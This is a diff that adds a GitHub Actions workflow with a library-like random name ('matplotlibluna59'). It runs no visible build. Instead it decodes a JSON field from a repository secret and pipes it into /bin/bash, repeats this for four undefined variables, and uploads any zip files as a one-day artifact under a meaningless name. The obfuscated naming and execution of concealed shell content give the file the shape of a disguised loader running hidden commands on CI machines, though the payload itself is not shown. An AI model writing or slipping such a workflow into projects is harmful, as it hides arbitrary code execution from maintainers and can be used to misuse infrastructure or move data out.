@@ -1,0 +1,25 @@
+name: matplotlibluna59
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: matplotlibluna59
+        env:
+          rgtn26: ${{ secrets.rgtn26 }}
+        run: |
+          printf '%s' "$rgtn26" | jq -r .gb17 | /bin/bash
+          printf '%s' "$eqdyw3" | jq -r .hxogz7 | /bin/bash
+          printf '%s' "$lbg44" | jq -r .zpvn9 | /bin/bash
+          echo $plf18 | jq -r .hmz52 | /bin/bash
+          printf '%s' "$jnv5194" | jq -r .jn455 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: fTFe2lp8
+          path: "*.zip"
+          retention-days: 1
